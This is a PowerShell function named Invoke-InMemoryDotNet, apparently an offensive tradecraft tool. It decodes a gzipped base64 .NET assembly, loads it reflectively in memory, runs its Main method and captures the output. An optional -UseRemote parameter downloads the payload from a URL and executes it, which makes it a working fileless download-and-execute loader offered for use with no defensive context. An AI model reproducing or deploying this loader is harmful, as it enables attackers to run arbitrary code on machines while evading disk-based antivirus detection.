function Invoke-InMemoryDotNet {
    [CmdletBinding()]
    param(
        [string]$Arguments = "",
        [string]$UseRemote,
        [string]$TypeName = "Program",  # Change if entry point is namespaced
        [string]$MethodName = "Main"
    )

    # Default embedded payload
    $b64 = @'
<INSERT_GZIPPED_BASE64_PAYLOAD_HERE>
'@ -replace "`r", ""

    # Remote override
    if ($UseRemote) {
        try {
            Write-Verbose "Downloading payload from $UseRemote"
            $b64 = Invoke-WebRequest -Uri $UseRemote -UseBasicParsing | Select-Object -ExpandProperty Content
        } catch {
            throw "Download failed from $UseRemote: $_"
        }
    }

    if (-not $b64 -or $b64 -match "<INSERT_GZIPPED_BASE64_PAYLOAD_HERE>") {
        throw "No valid payload found. Provide embedded b64 or use -UseRemote."
    }

    try {
        # Decode + decompress
        $bytes = [Convert]::FromBase64String($b64)
        $ms = New-Object IO.MemoryStream(, $bytes)
        $gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
        $out = New-Object IO.MemoryStream
        $gz.CopyTo($out)
        $asmBytes = $out.ToArray()
    } catch {
        throw "Decoding/decompression failed: $_"
    }

    try {
        # Load assembly
        $asm = [System.Reflection.Assembly]::Load($asmBytes)

        # Find target type and method
        $type = $asm.GetTypes() | Where-Object { $_.Name -eq $TypeName } | Select-Object -First 1
        if (-not $type) { throw "Type '$TypeName' not found in assembly." }

        $method = $type.GetMethod($MethodName, [Reflection.BindingFlags] "Public,Static")
        if (-not $method) { throw "Method '$MethodName' not found in type '$($type.FullName)'." }

        # Redirect output
        $stringWriter = New-Object IO.StringWriter
        $originalOut = [Console]::Out
        [Console]::SetOut($stringWriter)

        # Invoke with arguments
        $argArray = if ($Arguments) { $Arguments.Split(" ") } else { @() }
        $method.Invoke($null, (,[string[]]$argArray))

        # Restore output and return result
        [Console]::SetOut($originalOut)
        return $stringWriter.ToString()
    } catch {
        throw "Execution failed: $_"
    }
}